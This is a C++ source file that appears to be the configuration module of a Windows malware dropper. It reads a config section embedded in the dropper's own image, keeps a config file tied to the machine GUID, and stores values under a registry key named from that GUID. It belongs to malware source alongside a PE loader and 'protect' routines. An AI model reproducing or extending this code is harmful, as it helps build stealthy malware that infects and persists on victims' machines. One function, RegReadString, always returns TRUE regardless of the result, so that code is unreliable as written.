#include <intrin.h>
#include <stdio.h>
#include <windows.h>
#include <psapi.h>
#include <shlwapi.h>
#include <shlobj.h>

#include "dropper.h"
#include "config.h"
#include "protect.h"

#include "utils.h"
#include "seccfg.h"
#include "peldr.h"
#include "cfgini.h"

// Config
//----------------------------------------------------------------------------------------------------------------------------------------------------

CHAR Config::ConfigFileName[MAX_PATH];
PVOID Config::ConfigBuffer = NULL;
DWORD Config::ConfigSize = 0;

VOID Config::ReadConfig()
{
	SecCfg::SECTION_CONFIG Config;

	Config.Name = SECCFG_SECTION_NAME;
	if (SecCfg::GetSectionConfig(&Config, Drop::CurrentImageBase))
	{
		ConfigBuffer = Config.Config;
		ConfigSize = Config.Raw.ConfigSize;
	}

	Protect::GetNewPath(ConfigFileName, ".cfg");
}

BOOLEAN Config::WriteString(PCHAR Section, PCHAR Variable, PCHAR Value)
{
	return CfgfWriteString(ConfigFileName, Section, Variable, Value, Drop::GetMachineGuid());
}

BOOLEAN Config::ReadString(PCHAR Section, PCHAR Variable, PCHAR Value, DWORD Size)
{
	BOOLEAN Result = FALSE;
	PCHAR DefaultString = NULL;

	Result = (BOOLEAN)CfgsReadString(ConfigBuffer, ConfigSize, Section, Variable, &DefaultString);
	Result = (BOOLEAN)CfgfReadString(ConfigFileName, Section, Variable, DefaultString, Value, Size, Drop::GetMachineGuid());

	if (DefaultString) free(DefaultString);

	return Result;
}

DWORD Config::ReadInt(PCHAR Section, PCHAR Name)
{
	CHAR Buffer[20] = {0};

	ReadString(Section, Name, Buffer, RTL_NUMBER_OF(Buffer));

	return StrToInt(Buffer);
}

BOOLEAN Config::WriteInt(PCHAR Section, PCHAR Name, DWORD Int)
{
	CHAR Buffer[20] = {0};

	_snprintf(Buffer, sizeof(Buffer), "%d", Int);
	
	return WriteString(Section, Name, Buffer);
}

BOOLEAN Config::RegWriteString(PCHAR String, PCHAR Value)
{
	BOOLEAN bResult = FALSE;
	HKEY hKey;
	DWORD dwDisposition;
	CHAR KeyName[MAX_PATH] = "SOFTWARE\\";

	Protect::GetFileNameFromGuid(Drop::GetMachineGuid(), &KeyName[sizeof("SOFTWARE\\")-1]);
	LONG St = RegCreateKeyEx(HKEY_CURRENT_USER, KeyName, 0, NULL, 0, KEY_WRITE|KEY_READ, NULL, &hKey, &dwDisposition);
	if (St == ERROR_SUCCESS)
	{
		bResult = RegSetValueEx(hKey, String, 0, REG_SZ, (LPBYTE)Value, lstrlen(Value)) == ERROR_SUCCESS;

		RegCloseKey(hKey);
	}

	return bResult;
}

BOOLEAN Config::RegReadString(PCHAR String, PCHAR Value, DWORD dwValue)
{
	BOOLEAN bResult = FALSE;
	HKEY hKey;
	DWORD dwDisposition;
	CHAR KeyName[MAX_PATH] = "SOFTWARE\\";
	DWORD dwType = REG_SZ;

	Protect::GetFileNameFromGuid(Drop::GetMachineGuid(), &KeyName[sizeof("SOFTWARE\\")-1]);
	LONG St = RegCreateKeyEx(HKEY_CURRENT_USER, KeyName, 0, NULL, 0, KEY_WRITE|KEY_READ, NULL, &hKey, &dwDisposition);
	if (St == ERROR_SUCCESS)
	{
		bResult = RegQueryValueEx(hKey, String, NULL, &dwType, (LPBYTE)Value, &dwValue) == ERROR_SUCCESS;

		RegCloseKey(hKey);
	}

	return TRUE;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------
